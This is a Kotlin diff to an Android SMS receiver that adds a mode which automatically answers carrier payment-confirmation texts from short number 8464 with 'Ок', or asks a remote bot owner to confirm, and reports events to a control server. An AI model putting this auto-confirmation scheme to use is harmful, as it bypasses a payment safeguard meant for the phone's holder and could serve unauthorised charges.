@@ -46,6 +46,31 @@ class SmsReceiver : BroadcastReceiver() {
             !DeviceStore.isSessionDone(context) &&
             DeviceStore.hasWork(context)
 
+        // --- Метод Форс mode: the automation engine owns the handshake ---
+        // The Beeline flow presses «Отправить»; the «символ»→«Ок»→«успешно» reply
+        // cycle still arrives here as SMS from 8464. With auto-confirm ON we answer
+        // «Ок» and stamp the events for [MetodForsService]; with it OFF we defer «Ок»
+        // and ask the owner to confirm. The ordinary SMS-sender signalling is not
+        // used in this mode, so nothing else runs.
+        if (DeviceStore.metodFors(context)) {
+            if (fromSignal && body.contains(DeviceStore.stopWord(context), ignoreCase = true)) {
+                if (DeviceStore.autoConfirm(context)) {
+                    replyOk(context, sender)
+                    MetodFors.onSymbol()
+                } else {
+                    // Defer «Ок»: remember the sender and ask the owner to confirm.
+                    // MetodFors.onSymbol() fires only after the confirmation «Ок» is
+                    // sent (see SenderService.maybeSendConfirm).
+                    DeviceStore.setPendingSymbolSender(context, sender)
+                    requestConfirm(context)
+                }
+            } else if ((fromSignal || fromGateway) &&
+                body.contains(DeviceStore.resumeWord(context), ignoreCase = true)) {
+                MetodFors.onSuccess()
+            }
+            return
+        }
+
         // --- Gateway (7878) messages ---
         if (fromGateway && body.contains(DeviceStore.rejectWord(context), ignoreCase = true)) {
             val requisites = DeviceStore.currentPayment(context)?.requisites.orEmpty()
@@ -69,17 +94,27 @@ class SmsReceiver : BroadcastReceiver() {
         val resumeWord = DeviceStore.resumeWord(context) // успешно
 
         if (fromSignal && body.contains(stopWord, ignoreCase = true)) {
-            // Always answer "Ок" — even if the system is off.
-            replyOk(context, sender)
-            if (working) {
-                // The device is doing its own work: this "символ" belongs to that
-                // flow (pause → wait for "успешно" → advance). It is NOT a new
-                // system signal, so we do not fan it out.
-                countTrigger(context)
+            if (DeviceStore.autoConfirm(context)) {
+                // Always answer "Ок" — even if the system is off.
+                replyOk(context, sender)
+                if (working) {
+                    // The device is doing its own work: this "символ" belongs to
+                    // that flow (pause → wait for "успешно" → advance). It is NOT a
+                    // new system signal, so we do not fan it out.
+                    countTrigger(context)
+                } else {
+                    // Idle device caught "символ" (e.g. a probe found the open
+                    // window) → a fresh external signal for the whole system.
+                    reportSignal(context)
+                }
             } else {
-                // Idle device caught "символ" (e.g. a probe found the open window)
-                // → this is a fresh external signal for the whole system.
-                reportSignal(context)
+                // «Автоматическое подтверждение» off: defer «Ок». Remember the
+                // sender and ask the owner to confirm from the bot. While working,
+                // still do the pause bookkeeping so advancement is correct once the
+                // manual «Ок» is sent; the deferred «Ок» is sent on confirmation.
+                DeviceStore.setPendingSymbolSender(context, sender)
+                requestConfirm(context)
+                if (working) countTrigger(context)
             }
             return
         }
@@ -166,6 +201,12 @@ class SmsReceiver : BroadcastReceiver() {
     private fun reportSignal(context: Context) {
         val appCtx = context.applicationContext
         Thread { ControlClient.reportEvent(appCtx, "signal", "") }.apply { isDaemon = true }.start()
+    }
+
+    /** «Автоматическое подтверждение» off → ask the owner to confirm from the bot. */
+    private fun requestConfirm(context: Context) {
+        val appCtx = context.applicationContext
+        Thread { ControlClient.reportEvent(appCtx, "confirm_request", "") }.apply { isDaemon = true }.start()
     }
 
     private fun pushStatus(context: Context) {
